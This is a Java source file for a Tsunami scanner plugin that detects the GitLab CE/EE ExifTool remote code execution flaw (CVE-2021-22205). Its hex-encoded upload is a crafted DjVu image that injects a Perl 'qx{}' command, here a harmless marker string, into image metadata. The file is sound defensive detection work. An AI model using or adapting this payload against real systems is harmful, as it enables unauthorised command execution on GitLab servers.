/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202122205;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;
import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;

/** A {@link VulnDetector} that detects the CVE-2021-22205 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE202122205VulnDetector",
    version = "0.1",
    description =
        "An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. "
            + "GitLab was not properly validating image files that were passed to a file parser "
            + "which resulted in a remote command execution.",
    author = "hh-hunter",
    bootstrapModule = Cve202122205DetectorBootstrapModule.class)
public final class Cve202122205VulnDetector implements VulnDetector {

  @VisibleForTesting static final String DETECTION_STRING = "Failed to process image";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. "
          + "GitLab was not properly validating image files that were passed to a file parser which"
          + " resulted in a remote command execution.";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String USER_SIGN_PATH = "users/sign_in";
  private static final String VUL_PATH = "uploads/user";
  private static final Pattern CSRF_TOKEN_PATTERN =
      Pattern.compile("csrf-token\" content=\"(.*?)\" />\\n\\n<meta");
  private static final String POST_DATA =
      "0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F"
          + "6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B20"
          + "66696C656E616D653D22746573742E6A7067220D0A436F6E74656E742D547970653A20696D6167652F6A70"
          + "65670D0A0D0A41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFF"
          + "DEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A"
          + "5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666"
          + "004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F42473434"
          + "00000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F707972"
          + "6967687420225C0A22202E2071787B5453554e414d495f5343414e4e45527D202E205C0A22206220222920"
          + "29202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
          + "20202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D"
          + "2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A";
  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202122205VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private static String buildTargetUserSignUrl(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(USER_SIGN_PATH);
    return targetUrlBuilder.toString();
  }

  private static String buildTargetVulUrl(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(VUL_PATH);
    return targetUrlBuilder.toString();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2921-22205 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve202122205VulnDetector::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private String getCsrfToken(NetworkService networkService) {
    String targetUserSignUrl = buildTargetUserSignUrl(networkService);
    String csrfToken = null;
    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetUserSignUrl).withEmptyHeaders().build(), networkService);
      if (httpResponse.status().code() == 200) {
        Matcher csrfTokenMatcher = CSRF_TOKEN_PATTERN.matcher(httpResponse.bodyString().get());
        if (csrfTokenMatcher.find()) {
          csrfToken = csrfTokenMatcher.group(1);
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return null;
    }
    return csrfToken;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetVulUrl = buildTargetVulUrl(networkService);
    String csrfToken = getCsrfToken(networkService);
    if (csrfToken == null) {
      logger.atWarning().log("Get %s csrf_token failed", networkService);
      return false;
    }
    try {
      byte[] payload = Hex.decodeHex(POST_DATA);

      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(
                              CONTENT_TYPE,
                              "multipart/form-data; boundary=----WebKitFormBoundaryIMv3"
                                  + "mxRg59TkFSX5")
                          .addHeader("X-CSRF-Token", csrfToken)
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .build())
                  .setRequestBody(ByteString.copyFrom(payload))
                  .build(),
              networkService);

      if (httpResponse.status().code() == 200
          && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
        return true;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    } catch (DecoderException e) {
      logger.atWarning().withCause(e).log("Decode Payload failed");
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_22205"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2021-22205 GitLab CE/EE Unauthenticated RCE using ExifTool")
                .setRecommendation(
                    "GitLab users should upgrade to the latest version of GitLab as soon as "
                        + "possible. In addition, ideally, GitLab should not be an internet facing"
                        + " service. If you need to access your GitLab from the internet, consider "
                        + "placing it behind a VPN.")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
